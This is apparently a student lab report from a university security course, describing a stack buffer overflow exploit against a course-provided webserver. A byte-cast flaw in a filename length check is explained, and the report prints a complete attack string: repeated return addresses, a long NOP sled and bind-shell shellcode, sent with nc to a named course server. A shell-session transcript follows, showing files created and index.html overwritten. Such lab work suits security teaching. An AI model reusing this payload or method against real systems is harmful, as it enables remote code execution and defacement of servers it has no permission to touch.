Group 47: Kangnan Li, Fang Liu
Lab 3(Project 2): Hack into a server

Project requirement as below:
1. Find the vulnerability in webserver.c. You can grab this file by updating your git repo.
2. Use gdb to identify where the relevant variables are stored in memory.
3. Construct a request string that will exploit the vulnerability by overwriting variables stored on the stack.
4. Pwn a local webserver process.
5. Pwn a remote webserver process and send it shell commands to create a new file or modify index.html. This may take many attempts (but not prohibitively many) since you cannot be exactly sure where the remote server's stack is located.

Explanation of our method of attacha and review of the project as below:

1. identify the volnerability of the code. We read the code and use gdb to "print variable" to follow the change of each varialbe line by line (next, or step, which setting up "b 93"). Then we find, the casting of "len" to "byte" will only keep the lower 8 bits, therefore, as long as the length of our attach string, their lower 8 bits is smaller than 100, we can overflow the buffer with a very long attch string. We used a 853 byte attck string, 853%256=85 < 100.  
  ********in webserver.c handle() function *********
   if (check_filename_length(len)) {
      strncpy(filename, start, len);
    } 
**********in check_filename_length********
int check_filename_length(byte len) {
  	if (len < 100) {
    	return 1;
  	}
  	return 0;
}
****************************************

2. find the distance between "buffer" and RET
Before running the program, run "setarch `uname -m` -R /bin/bash" to disable randomization.
By using gdb, setting up a breakpoint before closing the socket "close(acceptsock);", we can using "info frame" in gdb to find the physical address of the "buffer" and RET, then we found their distance is about 140 bytes, which matches the professor suggestion on Piazza. We also found that, in gdb, we used "p &filename", the returned address of "buffer" will a little bit different from the program printed out address minus 140. This is due to gdb will put more stuff on the stack, so the offset will be a little different.
Finally, we used the printed address-140 as the actuall "buffer" address. 

3. Constuct attack string
attach string: 200 bytes RA + 580 bytes NOP + 73 bytes shellcode = 853 bytes in total
1) hack the local server
%%Three terminals well paricitate the hacking, T1, T2, T3
%%RA=printed out address -140+400; the attch port num in shellcode we used 19127
T1: ./webserver 9127
T2: echo -e "GET /RARA.....NOPNOP.....shellcode HTTP" | nc 127.0.0.1 9127
T3: nc 127.0.0.1 19127
2) hack the server
%%basicall the same as "hack into local server", RA will be the guessed NOP address
%%use 29127 as the attack port number
%% our group running port is 9127
%%our RA begin with the suggested address from Professor Chase as:  xbffffd84; then add 512 to get xbfffff84, which give us success.
T1: echo -e "GET /RARA....NOPNOP....shellcode HTTP" | nc 310test.cs.duke.edu 9127
T2: nc 310test.cs.duke.edu 29127

We successfully hacking in the server and add one string into the index.html. The details as below:
kangnan@kangnan-VirtualBox:~$ nc 310test.cs.duke.edu 29127
ls
nohup.out
www
mkdir group47comeine
ls
group47comeine
nohup.out
www
cd www
ls
index.html
webserver
webserver.c
echo "group 47 successfully hacking in and modify index.html" > index.html
ls
index.html
webserver
webserver.c
cat index.html
group 47 successfully hacking in and modify index.html


4.5. as summarized in 3

Other test files in our repo
testFile: shellcode examples from http://inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf
testFile: shellcode examples from http://www.vividmachines.com/shellcode/shellcode.html
shellcode.txt: the shellcode I used to hack local server and the remote server;

attach string to attck the server:
%% for server hacking
%% 200 bytes RA + 580 bytes NOP + 73 bytes shellcode
%% guessed NOP address: xbffffd84, xbfffff84
echo -e "GET /\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x84\xff\xff\xbf\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68\x71\xc7\x6a\x10\x51\x50\xb0\x66\x89\xe1\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80 HTTP" | nc 310test.cs.duke.edu 9127


